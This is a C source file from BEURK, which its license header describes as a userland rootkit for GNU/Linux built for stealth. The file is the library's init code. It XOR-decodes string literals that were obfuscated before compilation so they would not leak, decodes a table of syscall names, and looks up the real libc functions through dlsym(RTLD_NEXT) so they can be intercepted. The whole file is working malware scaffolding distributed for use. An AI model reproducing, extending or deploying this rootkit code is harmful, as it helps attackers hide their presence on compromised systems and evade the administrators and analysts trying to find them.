/*
 * BEURK is an userland rootkit for GNU/Linux, focused around stealth.
 * Copyright (C) 2015  unix-thrust
 *
 * This file is part of BEURK.
 *
 * BEURK is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * BEURK is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <string.h>
#include <dlfcn.h>
#include "beurk.h"


/** xorify a string whith XOR_KEY
 * (XOR_KEY is a macro defined in BEURK config file
 *
 * NOTE: disabled on debug mode (as on builder)
 */
#if DEBUG_LEVEL > 0
# define xor(...)
#else
static void     xor(char *p) {
    unsigned int i;

    for(i = 0; i < strlen(p); i++) {
        p[i] ^= XOR_KEY;
    }
}
#endif


/** re-xorify hidden literals.
 * hidden literals are all string literals used in the library
 * which are xorified before compilagtion in order to prevent
 * string leaking.
 *
 * this function restores clear literals values, as defined in
 * BEURK config file.
 */
static void     init_hidden_literals(void) {
    int     i;

    for (i=0; i<NUM_LITERALS; i++) {
        xor(__hidden_literals[i]);
    }
}


/** re-xorify syscalls table.
 */
static void     init_syscalls_table(void) {
    int     i;

    for (i=0; i<NUM_SYSCALLS; i++) {
        xor(beurk_syscalls_table[i]);
    }
}


/** initializes the global array beurk_syscalls_list
 * if dlsym fail, and DEBUG_MODE is activating, a error message
 * is print.
*/
static void     init_syscalls_list() {
    int  i;
    char *syscall;
    char *dl_error;

    dlerror();
    for (i = 0; i < NUM_SYSCALLS; i++) {
        syscall = beurk_syscalls_table[i];
        beurk_syscalls_list[i] = dlsym(RTLD_NEXT, syscall);
        if ((dl_error = dlerror()) != NULL)
            DEBUG(D_ERROR, dl_error);
    }
}


/** library constructor
 */
void        init(void)
{
    init_hidden_literals();
    init_syscalls_table();
    init_syscalls_list();
    DEBUG(D_INFO, "init() constructor loaded");
}
